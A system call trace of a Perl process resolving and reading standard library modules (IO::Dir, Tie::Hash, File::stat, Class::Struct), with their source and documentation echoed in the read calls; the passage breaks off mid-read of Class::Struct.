5498  07:09:19.840215 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.840235 read(10, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
5498  07:09:19.840759 stat64("/etc/perl/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840776 stat64("/etc/perl/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840790 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840802 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840816 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840829 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840843 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840854 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840867 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840879 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840892 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840908 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840921 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.840945 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
5498  07:09:19.840994 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.841039 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.841050 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.841069 read(11, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
5498  07:09:19.841373 read(11, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
5498  07:09:19.851020 read(11, "", 4096) = 0
5498  07:09:19.851039 close(11)         = 0
5498  07:09:19.851073 stat64("/etc/perl/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851089 stat64("/etc/perl/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851104 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851117 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851132 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851145 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851159 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851172 stat64("/usr/lib/perl5/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851185 stat64("/usr/share/perl5/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851198 stat64("/usr/share/perl5/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851211 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851224 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851238 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.851252 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
5498  07:09:19.851274 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.851290 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.851303 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.851321 read(11, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
5498  07:09:19.851791 stat64("/etc/perl/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851809 stat64("/etc/perl/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851824 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851837 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851851 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851865 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851879 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851891 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851905 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851918 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.851971 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.852000 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf9c1ccc) = -1 ENOENT (No such file or directory)
5498  07:09:19.852028 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf9c1dbc) = -1 ENOENT (No such file or directory)
5498  07:09:19.852041 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
5498  07:09:19.852063 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 12
5498  07:09:19.852079 ioctl(12, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1ad8) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.852090 _llseek(12, 0, [0], SEEK_CUR) = 0
5498  07:09:19.852110 read(12, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
5498  07:09:19.852517 brk(0x82de000)    = 0x82de000
5498  07:09:19.852867 read(12, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : 